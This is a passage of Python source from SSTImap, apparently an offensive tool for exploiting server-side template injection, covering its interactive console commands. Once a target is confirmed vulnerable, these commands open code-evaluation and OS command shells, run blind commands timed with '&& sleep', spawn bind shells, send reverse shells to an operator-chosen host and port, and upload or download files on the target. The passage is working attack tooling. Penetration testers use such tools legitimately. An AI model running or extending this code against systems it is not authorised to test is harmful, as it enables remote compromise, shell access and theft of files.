                MultilineShell(self.current_plugin.evaluate, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template base language shell')
        else:
            log.log(22, 'No language code evaluation capabilities have been detected on the target')

    do_eval = do_eval_shell

    def do_eval_code(self, line):
        """Evaluate single template command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'Language command cannot be empty.')
            return
        if self.channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'True or False is returned whether the code evaluates to a truthful value or not.')
            try:
                print(self.current_plugin.evaluate_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting language command execution')
        elif self.channel.data.get('evaluate'):
            try:
                print(self.current_plugin.evaluate(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting language command execution')
        else:
            log.log(22, 'No code evaluation capabilities have been detected on the target')

    def do_os_shell(self, line):
        """Provide interactive OS shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            if self.channel.data.get('boolean'):
                log.log(26, 'True or False is returned whether the command returns successfully or not.')
            else:
                log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                            'True or False is returned whether it returns successfully or not.')
            log.log(21, 'Run commands on the operating system.')
            try:
                Shell(self.current_plugin.execute_blind, f"{self.channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting OS shell')
        elif self.channel.data.get('execute'):
            log.log(21, 'Run commands on the operating system.')
            try:
                Shell(self.current_plugin.execute, f"{self.channel.data.get('os', 'undetected')} $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting OS shell')
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')

    do_shell = do_os_shell
    do_os = do_os_shell

    def do_os_cmd(self, line):
        """Execute single OS command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'OS command cannot be empty.')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            if self.channel.data.get('boolean'):
                log.log(26, 'True or False is returned whether the command returns successfully or not.')
            else:
                log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                        'True or False is returned whether it returns successfully or not.')
            try:
                print(self.current_plugin.execute_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting OS command execution')
        elif self.channel.data.get('execute'):
            try:
                print(self.current_plugin.execute(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting OS command execution')
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')

    def do_bind_shell(self, line):
        """Create bind shell on PORT"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '' or not line.isnumeric():
            log.log(22, 'Invalid PORT supplied for bind shell.')
            return
        port = int(line)
        if self.channel.data.get('bind_shell'):
            url = parse.urlparse(self.channel.base_url)
            if not url.hostname:
                log.log(22, "Error parsing hostname")
                return
            for idx, thread in enumerate(self.current_plugin.bind_shell(port, shell=self.channel.args.get('remote_shell'))):
                log.log(26, f'Spawn a shell on remote port {port} with payload {idx+1}')
                thread.join(timeout=1)
                if thread.is_alive():
                    log.log(24, f'Shell with payload {idx+1} seems stable')
                    break
            try:
                a = TcpClient(url.hostname, port, timeout=5)
                a.shell()
                return
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting bind shell')
            except Exception as e:
                log.log(25, f"Error connecting to {url.hostname}:{port} {e}")
        else:
            log.log(22, 'No TCP shell opening capabilities have been detected on the target')

    def do_reverse_shell(self, line):
        """Send reverse shell to HOST:PORT"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        dest = line.split(" ")
        if len(dest) != 2 or '' in dest:
            log.log(22, 'You must supply HOST and PORT for a reverse shell.')
            return
        host, port = dest
        if not port.isnumeric():
            log.log(22, 'Invalid PORT supplied for reverse shell.')
            return
        timeout = 15
        if self.channel.data.get('reverse_shell'):
            self.current_plugin.reverse_shell(host, port, shell=self.channel.args.get('remote_shell'))
            try:
                TcpServer(int(port), timeout)
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting reverse shell')
            except socket.timeout:
                log.log(22, f"No incoming TCP shells after {timeout}s, quitting.")
        else:
            log.log(22, 'No reverse TCP shell capabilities have been detected on the target')

    do_bind = do_bind_shell
    do_reverse = do_reverse_shell

    def do_force_overwrite(self, line):
        """Switch forсe_overwrite option"""
        overwrite = not self.sstimap_options["force_overwrite"]
        log.log(24, f'{"En" if overwrite else "Dis"}abled forceful overwriting files')
        self.sstimap_options["force_overwrite"] = overwrite

    do_overwrite = do_force_overwrite

    def do_upload(self, line):
        """Upload LOCAL to REMOTE file"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, 'You must supply LOCAL and REMOTE paths for upload.')
            return
        if self.channel.data.get('write'):
            local_path, remote_path = paths
            try:
                with open(local_path, 'rb') as f:
                    data = f.read()
                self.current_plugin.write(data, remote_path)
            except FileNotFoundError:
                log.log(25, f'Local file not found: {local_path}')
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting file upload')
        else:
            log.log(22, 'No file upload capabilities have been detected on the target')

    def do_download(self, line):
        """Download REMOTE to LOCAL file"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, 'You must supply REMOTE and LOCAL paths for download.')
            return
        if self.channel.data.get('read'):
            remote_path, local_path = paths
            try:
                content = self.current_plugin.read(remote_path)
                with open(local_path, 'wb') as f:
                    f.write(content)
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting file download')
        else:
            log.log(22, 'No file download capabilities have been detected on the target')

    do_up = do_upload
    do_down = do_download

# SSTImap commands

    def do_reload_modules(self, line):
        """Reload all modules"""
        from core.plugin import unload_plugins
        from sstimap import load_plugins
        unload_plugins()
        load_plugins()
        from core.plugin import loaded_plugins
        log.log(23, f"Reloaded plugins by categories: {'; '.join([f'{x}: {len(loaded_plugins[x])}' for x in loaded_plugins])}")
        from core.data_type import unload_data_types
        from sstimap import load_data_types
        unload_data_types()
        load_data_types()
        from core.data_type import loaded_data_types
        log.log(26, f"Loaded request body types: {len(loaded_data_types)}")

    do_reload = do_reload_modules
